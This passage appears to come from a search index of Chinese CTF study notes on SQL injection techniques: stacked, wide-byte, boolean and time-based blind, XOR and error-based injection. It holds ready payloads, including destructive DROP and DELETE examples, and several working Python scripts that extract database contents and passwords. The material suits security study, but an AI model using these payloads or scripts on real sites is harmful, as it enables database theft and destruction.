<p>\u603b\u7684\u6765\u8bf4\uff0c\u5c31\u662f\u7528\u6237\u8f93\u5165\u4e86\u4e00\u4e2a\u6570\u636e\uff0c\u670d\u52a1\u5668\u5c06\u4ed6\u751f\u786c\u7684\u62fc\u63a5\u6210\u4e86\u4e00\u6761SQL\u8bed\u53e5\u3002\u7136\u540e\u653e\u5728\u670d\u52a1\u5668\u4e0a\u9762\u53bb\u6267\u884c\u5e76\u53cd\u9988\u7ed9\u653b\u51fb\u8005\u3002\u5982\u679c\u67e5\u8be2\u8bed\u53e5\u53ef\u4ee5\u88ab\u63a7\u5236\uff0c\u76f8\u5f53\u4e8e\u653b\u51fb\u8005\u80fd\u591f\u62ff\u5230\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u7684\u5168\u90e8\u6570\u636e\uff08\u901a\u5e38\u4e5f\u5305\u542b\u8d26\u53f7\u548c\u5bc6\u7801\uff09\uff0c\u5371\u5bb3\u4e25\u91cd\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#sql","title":"\u57fa\u672cSQL\u6ce8\u5165","text":"<p>SQL\u6ce8\u5165\u7684\u6838\u5fc3\u662f\u95ed\u5408\uff0c\u901a\u8fc7\u4f20\u8f93\u6570\u636e\u4fee\u6539\uff0c\u64cd\u7eb5\u670d\u52a1\u5668\u7aef\u7684sql\u8bed\u53e5</p> <p>\u6316\u6398\u65f6\u7684\u603b\u4f53\u601d\u8def</p> <p>1\uff1a\u5bfb\u627e\u5230SQL\u6ce8\u5165\u7684\u4f4d\u7f6e</p> <p>2\uff1a\u5224\u65ad\u670d\u52a1\u5668\u7c7b\u578b\u548c\u540e\u53f0\u6570\u636e\u5e93\u7c7b\u578b\uff08mysql\u6700\u591a\uff0c\u4e0d\u8fc7sqlite\u6700\u8fd1\u4e5f\u591a\u4e86\u8d77\u6765\uff09</p> <p>3\uff1a\u9488\u5bf9\u4e0d\u540c\u7684\u670d\u52a1\u5668\u548c\u6570\u636e\u5e93\u7279\u70b9\u8fdb\u884cSQL\u6ce8\u5165\u653b\u51fb\uff08\u4f1a\u6709\u4e9b\u5dee\u522b\uff0c\u4f46\u57fa\u672c\u7684\u8fd8\u662f\u8981\u4f1a\u7684\uff0c\u53d8\u4e0d\u79bb\u5176\u5b97\uff09</p> <p>\u8fdb\u5165\u4e3e\u4f8b</p> <pre><code>\"select * from user_table where username=' username ' and password='  password '\";\n</code></pre> <p>\u8fd9\u6761\u8bed\u53e5\u5c31\u662f\u666e\u901a\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u4ece\u6570\u636e\u5e93\u4e2d\u53d6\u51fausername\u548cpassword\u3002</p> <p>\u6ca1\u6709\u7684\u8bdd\u5c31\u51fa\u9519\uff0c\u767b\u5f55\u4e0d\u4e86\uff0c\u975e\u5e38\u7b80\u5355</p> <p>\u4e5f\u5c31\u662f\u8bf4\u73b0\u5728username\u548cpassword\u7684\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236</p> <p>\u7136\u540e\u6211\u4eec\u8f93\u5165\u8bed\u53e5</p> <p>username=1' or 1=1--</p> <p>\u7a0d\u5fae\u5206\u6790\u4e00\u4e0b</p> <p>--\u8868\u793a\u6ce8\u91ca\uff0c\u4f1a\u5ffd\u7565\u6389\u540e\u9762\u7684\u8bed\u53e5</p> <p>\u6574\u4e2asql\u6ce8\u5165\u8bed\u53e5\u5c31\u53d8\u6210\u4e86</p> <pre><code>select * from user_table where username='1' or 1=1--[[[[[' and password='  password ']]]]]\u610f\u601d\u4e00\u4e0b\uff0c\u8868\u6ce8\u91ca--\u5176\u5b9e\u4e5f\u53ef\u4ee5\u7528#\u6765\u66ff\u4ee3\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\uff0c\u524d\u9762\u7684\u4e00\u4e2a\u5728\u539f\u8bed\u53e5\u4e2d\u7684\u5f15\u53f7\u548c\u6211\u4eec\u8f93\u5165\u7684\u4e00\u4e2a\u5f15\u53f7\u4e00\u8d77\u7ec4\u6210\u4e86username\u540e\u9762\u53c8\u591a\u4e86\u4e86\u4e00\u4e2a1=1\uff0c\u8fd9\u662f\u4e00\u5b9a\u4f1a\u6210\u7acb\u7684\u3002\u7136\u540e\u6574\u53e5\u8bdd\u7684\u903b\u8f91\uff0c\u7531\u4e8e\u6216\uff08or\uff09\u7684\u51fa\u73b0\uff0c\u4e00\u5b9a\u4e3a\u771f\uff0c\u597d\u7684\uff0c\u6574\u6761\u8bed\u53e5\u6709\u53ef\u80fd\u5c31\u5728\u4ee3\u7801\u91cc\u8fd4\u56deture\uff0c\u7136\u540e\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u3002\u8fd9\u5c31\u662f\u76f8\u5bf9\u7b80\u5355\u7684sql\u6ce8\u5165\u3002</p> <p>\u8fd9\u91cc\u6ca1\u6709\u4e00\u70b9\u8fc7\u6ee4\uff0c\u800c\u4e14\u53ef\u4ee5\u6267\u884c</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u51651'; drop database()--\u6216\u8005\u5176\u4ed6\u7206\u51fa\u6570\u636e\u5e93\u7684\u8bed\u53e5\u3002</p> <p>\u8fd9\u6837\u7684\u653b\u51fb\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u8005\u662f\u670d\u52a1\u5668\uff0c\u6740\u4f24\u529b\u4e0d\u8a00\u800c\u55bb\u3002</p> <p>\u800c\u4e14sql\u6ce8\u5165\u5e76\u4e0d\u662f\u56e0\u4e3a\u67d0\u4e9b\u5e95\u5c42\u51fa\u73b0\u4e86\u6f0f\u6d1e\uff0c\u5355\u7eaf\u662f\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53</p> <p>R.I.P.</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","title":"\u5806\u53e0\u6ce8\u5165","text":""},{"location":"web_bak/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_2","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u5728SQL\u4e2d\uff0c\u5206\u53f7\uff08;\uff09\u662f\u7528\u6765\u8868\u793a\u4e00\u6761sql\u8bed\u53e5\u7684\u7ed3\u675f\u3002\u8bd5\u60f3\u4e00\u4e0b\u6211\u4eec\u5728 ; \u7ed3\u675f\u4e00\u4e2asql\u8bed\u53e5\u540e\u7ee7\u7eed\u6784\u9020\u4e0b\u4e00\u6761\u8bed\u53e5\uff0c\u4f1a\u4e0d\u4f1a\u4e00\u8d77\u6267\u884c\uff1f\u56e0\u6b64\u8fd9\u4e2a\u60f3\u6cd5\u4e5f\u5c31\u9020\u5c31\u4e86\u5806\u53e0\u6ce8\u5165\u3002\u800cunion injection\uff08\u8054\u5408\u6ce8\u5165\uff09\u4e5f\u662f\u5c06\u4e24\u6761\u8bed\u53e5\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u4e24\u8005\u4e4b\u95f4\u6709\u4ec0\u4e48\u533a\u522b\u4e48\uff1f\u533a\u522b\u5c31\u5728\u4e8eunion \u6216\u8005union all\u6267\u884c\u7684\u8bed\u53e5\u7c7b\u578b\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u800c\u5806\u53e0\u6ce8\u5165\u53ef\u4ee5\u6267\u884c\u7684\u662f\u4efb\u610f\u7684\u8bed\u53e5\u3002\u4f8b\u5982\u4ee5\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\u3002\u7528\u6237\u8f93\u5165\uff1a1; DELETE FROM products\u670d\u52a1\u5668\u7aef\u751f\u6210\u7684sql\u8bed\u53e5\u4e3a\uff1a\uff08\u56e0\u672a\u5bf9\u8f93\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff09Select * from products where productid=1;DELETE FROM products\u5f53\u6267\u884c\u67e5\u8be2\u540e\uff0c\u7b2c\u4e00\u6761\u663e\u793a\u67e5\u8be2\u4fe1\u606f\uff0c\u7b2c\u4e8c\u6761\u5219\u5c06\u6574\u4e2a\u8868\u8fdb\u884c\u5220\u9664\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_3","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2a\u662f\u4e00\u8d77\u6267\u884c\uff0c\u4e00\u4e2a\u662f\u5206\u5f00\u6765\u6267\u884c\u3002\u4f46\u662f\u5806\u53e0\u6ce8\u5165\u7684\u6743\u9650\uff0c\u73af\u5883\u8981\u6c42\u662f\u6bd4\u8054\u5408\u67e5\u8be2\u9ad8\u7684\uff0c\u800c\u4e14\u670d\u52a1\u5668\u7aef\u5e94\u8be5\u5927\u90e8\u5206\u60c5\u51b5\u4e0d\u4f1a\u8fd4\u56de\u4e24\u6761\u67e5\u8be2\u7ed3\u679c\u3002\u6838\u5fc3\u5c31\u662f\u90a3\u4e2a\";\".</p> <p>\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u9898\uff1a\u5f3a\u7f51\u676f2019\u968f\u4fbf\u6ce8</p> <p>https://blog.csdn.net/qq_26406447/article/details/90643951</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","title":"\u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>\u8fd9\u79cd\u6ce8\u5165\u65b9\u5f0f\u8bd5\u5229\u7528\u7f16\u7801\u7684\u89e3\u6790\u7279\u6027</p> <p>\u5f53php.ini\u4e2dmagic_quotes_gpc\u88ab\u8bbe\u7f6e\u4e3aon\u65f6\uff0c\u63d0\u4ea4\u7684\u53c2\u6570\u4f1a\u88ab\u8f6c\u4e49\uff0c\u4f8b\u5982\uff0c\u5355\u5f15\u53f7\u4f1a\u88ab\u8f6c\u4e49\u6210\u4e86\u2019\u3002\u4e00\u4e0b\u5b50\u622a\u65ad\u4e86\u5b57\u7b26\u578b\u6ce8\u5165\u7684\u8def\u3002</p> <p>GBK\u53cc\u5b57\u8282\u7f16\u7801\uff1a\u4e00\u4e2a\u6c49\u5b57\u7528\u4e24\u4e2a\u5b57\u8282\u8868\u793a\uff0c\u9996\u5b57\u8282\u5bf9\u5e940x81-0xFE\uff0c\u5c3e\u5b57\u8282\u5bf9\u5e940x40-0xFE\uff08\u96640x7F\uff09\uff0c\u521a\u597d\u6db5\u76d6\u4e86\u5bf9\u5e94\u7684\u7f16\u78010x5C\u3002</p> <p>0xD5 0x5C \u5bf9\u5e94\u4e86\u6c49\u5b57\u201c\u8aa0\u201d\uff0c\u4e8e\u662f %d5%5c \u7ecfURL\u89e3\u7801\u540e\u4e3a\u201c\u8aa0\u201d\u3002</p> <p>\u5f53\u6211\u4eec\u63d0\u4ea4\u53c2\u6570 %d5\u2032 \uff0c\u7ecf\u6d4f\u89c8\u5668URL\u7f16\u7801\u540e\u4e3a%d5%27\uff0c\u518d\u7ecfPHP URL\u89e3\u7801\u540e\u4e3a0xd50x27\uff0c\u518d\u7ecfPHP\u8f6c\u4e49\u540e\u4e3a0xd50x5c0x27\uff0c\u5373\u5c31\u662f\u57280x27(\u2018)\u4e4b\u524d\u63d2\u5165\u4e86\u8f6c\u4e49\u7b260x5c\uff08\\\uff09\u3002\u5f53MySQL\u91c7\u7528GBK\u7f16\u7801\u8fde \u63a5\u65f6\uff0c0xd50x5c0x27\u8fd9\u4e00\u5b57\u8282\u5e8f\u5217\u5c31\u88abMySQL\u4f5c\u4e3aGBK\u7f16\u7801\u7406\u89e3\uff1a\u8aa0\u2019\u3002</p> <p>\u8fd9\u6837\u5c31\u5403\u6389\u4e86PHP\u7684\u8f6c\u4e49\u7b26\uff0c\u4ece\u800c\u7a81\u7834\u4e86\u5355\u5f15\u53f7\u8f6c\u4e49\u7684\u9650\u5236\u3002</p> <p>\u8fc7\u6ee4 ' \u7684\u65f6\u5019\u5f80\u5f80\u5229\u7528\u7684\u601d\u8def\u662f\u5c06 '\u8f6c\u6362\u4e3a \\' \u3002</p> <p>\u5728 mysql \u4e2d\u4f7f\u7528 GBK \u7f16\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u4e3a\u4e00\u4e2a\u6c49\u5b57\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u601d\u8def\uff1a</p> <p>\uff081\uff09%df \u5403\u6389  \u5177\u4f53\u7684\u65b9\u6cd5\u662f urlencode(') = %5c%27\uff0c\u6211\u4eec\u5728 %5c%27 \u524d\u9762\u6dfb\u52a0 %df \uff0c\u5f62\u6210%df%5c%27 \uff0c\u800c mysql \u5728 GBK \u7f16\u7801\u65b9\u5f0f\u7684\u65f6\u5019\u4f1a\u5c06\u4e24\u4e2a\u5b57\u8282\u5f53\u505a\u4e00\u4e2a\u6c49\u5b57\uff0c%df%5c \u5c31\u662f\u4e00\u4e2a\u6c49\u5b57\uff0c%27 \u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\uff08'\uff09\u7b26\u53f7\u5728\u5916\u9762\uff1a</p> <p>id=-1%df%27union select 1,user(),3--+</p> <p>\uff082\uff09\u5c06 \\' \u4e2d\u7684  \u8fc7\u6ee4\u6389\uff0c\u4f8b\u5982\u53ef\u4ee5\u6784\u9020 %**%5c%5c%27 \uff0c\u540e\u9762\u7684 %5c \u4f1a\u88ab\u524d\u9762\u7684 %5c \u6ce8\u91ca\u6389\u3002</p> <p>\u4e00\u822c\u4ea7\u751f\u5bbd\u5b57\u8282\u6ce8\u5165\u7684PHP\u51fd\u6570\uff1a</p> <p>1.replace\uff08\uff09\uff1a\u8fc7\u6ee4 '  \uff0c\u5c06 ' \u8f6c\u5316\u4e3a \\' \uff0c\u5c06  \u8f6c\u4e3a \\\uff0c\u5c06 \" \u8f6c\u4e3a \\\" \u3002\u7528\u601d\u8def\u4e00\u3002</p> <p>2.addslaches()\uff1a\u8fd4\u56de\u5728\u9884\u5b9a\u4e49\u5b57\u7b26\u4e4b\u524d\u6dfb\u52a0\u53cd\u659c\u6760\uff08\\\uff09\u7684\u5b57\u7b26\u4e32\u3002\u9884\u5b9a\u4e49\u5b57\u7b26\uff1a' , \" ,  \u3002\u7528\u601d\u8def\u4e00</p> <p>3..mysql_real_escape_string()\uff1a\u8f6c\u4e49\u4e0b\u5217\u5b57\u7b26\uff1a</p> <p>\\x00    \\n     \\r         '     \"     \\x1a</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<p>\u5e03\u5c14\u76f2\u6ce8\uff0c\u6545\u540d\u601d\u610f\uff0c\u4e0ebool\u4ee3\u6570\u7684\u8fd0\u7b97\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u548ctrue\u548cfalse\u6709\u5173</p> <p>\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u54cd\u5e94\uff0c\u751f\u6d3b\u4e2d\u8fd9\u4e2a\u6f0f\u6d1e\u76f8\u5bf9\u6765\u8bf4\u8fd8\u662f\u6bd4\u8f83\u591a\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u95ee\u670d\u52a1\u5668XXX\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fa\u4ed6\u544a\u8bc9\u4f60\u4e0d\u662f\uff0c\u7136\u540e\u4f60\u95ee\u5b83\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u4e0d\u662fb..................................\u4e00\u76f4\u63a8\u4e0b\u53bb\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e00\u4e2a\u5b57\u7b26\u7206\u7834\u51fa\u4f60\u60f3\u67e5\u8be2\u7684\u4fe1\u606f\u3002</p> <p>\u4e3b\u8981\u9760\u7684\u8fd8\u662f\u624e\u5b9e\u7684py\u811a\u672c\u529f\u592b</p> <p>bool\u76f2\u6ce8\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2abool\u76f2\u6ce8\u7684\u811a\u672c</p> <p>\u8fd9\u91cc\u90fd\u662f\u4e8c\u5206\u6cd5\uff0c\u904d\u5386\u4e5f\u884c\uff0c\u4f46\u5927\u5bb6\u90fd\u5b66\u8fc7\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5bf9\u5427\u3002</p> <pre><code>import requests\nimport time\nurl = \"\"\nfiles = {\"file\": \"123456789\"}\n'''\u5b57\u6bb5\u503c'''\nflag=''\nfor i in range(1,100):\nlow = 32\nhigh = 128\nmid = (low+high)//2\nwhile (low &lt; high):\ntime.sleep(0.06)\npayload_flag = {\n'username': \"test\\\" or (ascii(substr((select secret from flag_tbl),{0},1))&gt;{1}) #\".format(i,mid),'password': 'test'}\nr = requests.post(url=url,params=payload_flag,files=files, data={\"PHP_SESSION_UPLOAD_PROGRESS\": \"123456789\"},\ncookies={\"PHPSESSID\": \"test1\"})\nprint(payload_flag)\nif '&lt;meta http-equiv=\"refresh\" content=\"0; url=?p=home\" /&gt;' in r.text:\nlow = mid +1\nelse:\nhigh = mid\nmid = (low + high) // 2\nif(mid==32 or mid == 132):\nbreak\nflag +=chr(mid)\nprint(flag)\nprint(flag)\n</code></pre> <pre><code>import requests\nurltest=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),1,1))=114%23\" #\u9a8c\u8bc1\u9875\u9762\uff0c\u901a\u5e38\u4e3a\u6b63\u786e\u9875\u9762\nURL=requests.get(urltest)\nfor j in range(1,10):\nfor i in range(33,125):\ni=str(i)\nj=str(j)\nurl=\"http://127.0.0.1/index.php?id=1' and ascii(substr((select user()),\"+j+\",1))=\"+i+\"%23\" #\u6ce8\u5165\u7528\u4e8e\u6bd4\u5bf9\u7684URL\n#print url\nurl=requests.get(url)\nif url.text==URL.text:\nprint chr(int(i))\n---------------------------------------------------\nimport requests\ndef database_len():\nfor i in range(1,10):\nurl = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''\npayload = '''?id=1' and length(database())&gt;%s''' %i\n# print(url+payload+'%23')\nr = requests.get(url+payload+'%23')\nif 'You are in' in r.text:\nprint(i)\n\nelse:\n#print('false')\nprint('database_length:',i)\nbreak\ndatabase_len()\n\ndef database_name():\nname = ''\nfor j in range(1,9):\nfor i in 'sqcwertyuioplkjhgfdazxvbnm':\nurl = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'\" %(j,i)\n# print(url+'%23')\nr = requests.get(url+'%23')\nif 'You are in' in r.text:\nname = name+i\n\nprint(name)\n\nbreak\nprint('database_name:',name)\n\n\n\ndatabase_name()\n</code></pre> <pre><code>import time\nimport requests\nurl = \"\"\nresult = ''\ni = 0\nwhile True:\ni = i + 1\nhead = 32\ntail = 127\nwhile head &lt; tail:\nmid = (head + tail) &gt;&gt; 1\n# payload = '(ascii(substr(database(),%d,1))&gt;%d)' % (i, mid)\n# payload = f'(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})'\n# payload = f'(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\"F1naI1y\")),{i},1))&gt;{mid})'\npayload = f'(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))&gt;{mid})'\nr = requests.get(url + payload)\n# print(r.text)\ntime.sleep(0.1)\nif \"Click\" in r.text:\nhead = mid + 1\nelse:\ntail = mid\nif head != 32:\nresult += chr(head)\nelse:\nbreak\nprint(result)\n</code></pre> <pre><code>import requests\nimport time\n# url\u662f\u968f\u65f6\u66f4\u65b0\u7684\uff0c\u5177\u4f53\u7684\u4ee5\u505a\u9898\u65f6\u5019\u7684\u4e3a\u51c6\nurl = 'http://8d08c7b6-e6f3-4df0-b71c-a2a397891bab.node3.buuoj.cn/search.php?id='\ni = 0\nflag = ''\nwhile True:\ni += 1\n# \u4ece\u53ef\u6253\u5370\u5b57\u7b26\u5f00\u59cb\nbegin = 32\nend = 126\ntmp = (begin + end) // 2\nwhile begin &lt; end:\nprint(begin, tmp, end)\ntime.sleep(0.1)\n# \u7206\u6570\u636e\u5e93\n# payload = \"''or(ascii(substr(database(),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u8868\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206\u5b57\u6bb5\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u8981\u8dd1\u5f88\u4e45\n# payload = \"''or(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)\" % (i, tmp)\n# \u7206flag \u5f88\u5feb\npayload = \"''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))&gt;%d)\" % (i, tmp)\n# \u9519\u8bef\u793a\u4f8b\n# payload = \"''or(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))&gt;%d)\" % (i, tmp)\nr = requests.get(url+payload)\nif 'Click' in r.text:\nbegin = tmp + 1\ntmp = (begin + end) // 2\nelse:\nend = tmp\ntmp = (begin + end) // 2\nflag += chr(tmp)\nprint(flag)\nif begin == 32:\nbreak\n</code></pre> <p>\u56e0\u4e3abool\u76f2\u6ce8\u7684\u4f4d\u7f6e\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u6709\u53ef\u80fd\u662f\u5728url\u4e2d\u4ee5get\u5f62\u5f0f\uff0c\u6216\u8005POST\u51fa\u7684\u6570\u636e\u7b49\u7b49\u6240\u4ee5\u6a21\u677f\u5f62\u5f0f\u4e5f\u4e0d\u552f\u4e00\uff0c\u4e0d\u8fc7\u53ea\u8981\u638c\u63e1requests\u5305\uff08\u7c7b\u4f3c\u5b66pwn\u7684\u90fd\u4f1a\u7528\u5230\u7684pwn\uff09\uff0c\u7406\u89e3\u53d1\u9001http\u7684\u6d41\u7a0b\uff0c\u5c31\u662f\u5728\u6a21\u677f\u4e0a\u8fdb\u884c\u4fee\u6539\u7684\u64cd\u4f5c\u4e86\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_2","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u539f\u7406\u548cbool\u76f2\u6ce8\u4e00\u6a21\u4e00\u6837</p> <p>\u533a\u522b\u70b9\u5728\u4e8ebool\u5224\u65ad\u503c\u53d8\u6210\u4e86\u65f6\u95f4</p> <p>\u4e5f\u5c31\u662f\u8bf4\u5982\u679cbool\u4e3atrue,\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a0.1s</p> <p>\u5982\u679c\u4e3afalse\uff0c\u8fd4\u56de\u7684\u65f6\u95f4\u4e3a1s</p> <p>\u8fd9\u4e0d\u5c31\u662f\u4e2a\u5bf9\u9519\u4e86\u561b</p> <p>\u6240\u4ee5\u76f4\u63a5\u5c31\u7ed9\u51fa\u811a\u672c\u4e86</p> <pre><code>import requests\nurl=\"http://fe5d8a13-c089-4e47-847d-b43c1622a20d.node3.buuoj.cn/index.php?action=publish\"\ncookie = {\"PHPSESSID\":\"silql33d2jbdqnqp0l6san8rr4\"}\nk=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nflag=\"\"\nfor i in range(50):\nfor j in k:\nj = ord(j)\ndata={\n'mood':'0',\n'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)\n}\ntry:\nr=requests.post(url,data=data,cookies=cookie,timeout=(2,2))\nexcept:\nflag+=chr(j)\nprint(flag)\nbreak\n</code></pre> <p>\u867d\u7136\u9488\u5bf9\u7279\u522b\u7684\u9898\u76ee\uff0c\u4f46\u662f\u6539\u4e00\u6539\u5c31\u80fd\u7528\u4e86\uff0c\u751a\u81f3\u4e5f\u80fd\u591f\u6539\u9020\u6210bool\u76f2\u6ce8\u7684\u811a\u672c\u3002</p> <p>\u627e\u4e0d\u5230\u5f53\u65f6\u7684\u4f8b\u9898\u4e86</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/#_3","title":"\u5f02\u6216\u6ce8\u5165","text":"<p>\u5f02\u6216\u6ce8\u5165\u5f0f\u4e00\u79cd\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u66f4\u50cf\u662f\u4e00\u79cd\u601d\u7ef4</p> <p>\u5728\u8ba1\u7b97\u673a\u4e8c\u8fdb\u5236</p> <p>1^1=0</p> <p>1^0=1</p> <p>0^1=1</p> <p>0^0=0</p> <p>\u7136\u540e\u80fd\u5e72\u5565\u5462\uff1f</p> <p>\u8003\u8651\u8fd9\u6837\u7684sql\u8bed\u53e5</p> <pre><code>id=1^(ascii(substr((select(database())),%d,1))&lt;%d)^1\" % (i,mid)\n</code></pre> <p>\u8fd9\u662f\u4e00\u6761python\u8bed\u53e5\uff0c\u770b\u7684\u5230\u7684\u662f\u5f02\u6216\u3002</p> <p>\u7136\u540e\u4e2d\u95f4\u7684(ascii(substr((select(database())),%d,1))&lt;%d)\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f</p> <p>\u8fd4\u56de\u7684\u662ftrue\u6216false\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u53ef\u4ee5\u770b\u6210\u662f1\u548c0</p> <p>\u7136\u540e\u4ed4\u7ec6\u770b\u6267\u884c\u7684sql\u8bed\u53e5\u53d61\u4e2a\u5b57\u7b26\u8f6c\u6362\u4e3aascii\u7801\u548c\u4e00\u4e2a\u6570\u5b57\u505a\u6bd4\u8f83\uff0c\u5f97\u52301\u62160\uff0c\u518d\u5f02\u6216.</p> <p>\u6700\u7ec8id=1\u62160</p> <p>\u5047\u5982\u6b64\u65f6\u5f53id=1\u65f6\u56de\u663e\u6b63\u5e38\uff0c\u4e3a0\u65f6\u56de\u663e\u9519\u8bef\uff0c\u6211\u4eec\u5c31\u6709\u4e86\u4e00\u4e2a\u5b89\u5168\u53ef\u9760\u7684\u6bd4\u8f83\u5668\u3002</p> <p>\u8fd9\u91cc\u5176\u5b9e\u662fbool\u76f2\u6ce8\u7684\u59ff\u52bf\u3002</p> <p>\u5176\u5b9e\u8fd9\u6837\u5f02\u6216\u7684\u601d\u60f3\u5728\u5f88\u591a\u5730\u65b9\u90fd\u5b58\u5728\uff1a</p> <p>\u751a\u81f3\u8fc7\u6ee4\u4e86\u6570\u5b57\u5b57\u6bcd</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528\u4e24\u4e2a\u6c49\u5b57\u5f02\u6216\u6765\u8fdb\u884c\u6ce8\u5165\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","title":"\u62a5\u9519\u6ce8\u5165","text":"<p>\u5f88\u91cd\u8981\uff0c\u800c\u4e14\u539f\u7406\u4e0a\u6211\u89c9\u5f97\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u96be\u7406\u89e3\u3002</p> <p>\u5f53\u7136\u7528\u8d77\u6765\u7531\u4e8e\u6bd4\u8f83\u56fa\u5b9a\uff0c\u62ff\u7740\u73b0\u6210\u7684payload\u6162\u6162\u53bb\u6539\u5c31\u884c\u4e86</p> <p>\u62a5\u9519\u6ce8\u5165\u5728\u6ca1\u6cd5\u7528union\u8054\u5408\u67e5\u8be2\u65f6\u7528\uff0c\u4f46\u524d\u63d0\u8fd8\u662f\u4e0d\u80fd\u8fc7\u6ee4\u4e00\u4e9b\u5173\u952e\u7684\u51fd\u6570\u3002</p> <p>\u62a5\u9519\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u6570\u636e\u5e93\u7684\u67d0\u4e9b\u673a\u5236\uff0c\u4eba\u4e3a\u5730\u5236\u9020\u9519\u8bef\u6761\u4ef6\uff0c\u4f7f\u5f97\u67e5\u8be2\u7ed3\u679c\u80fd\u591f\u51fa\u73b0\u5728\u9519\u8bef\u4fe1\u606f\u4e2d\u3002\u770b\u8fc7\u65e0\u5217\u540d\u6ce8\u5165\u90a3\u91ccjoin\u7684\u8bdd\uff0c\u6309\u9053\u7406\u6765\u8bf4\uff0c\u539f\u7406\u5dee\u4e0d\u591a\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#xpath","title":"xpath\u8bed\u6cd5\u9519\u8bef","text":"<p>\u5229\u7528xpath\u8bed\u6cd5\u9519\u8bef\u6765\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u4e3b\u8981\u5229\u7528<code>extractvalue</code>\u548c<code>updatexml</code>\u4e24\u4e2a\u51fd\u6570\u3002</p> <p>\u4f7f\u7528\u6761\u4ef6\uff1amysql\u7248\u672c&gt;5.1.5</p> 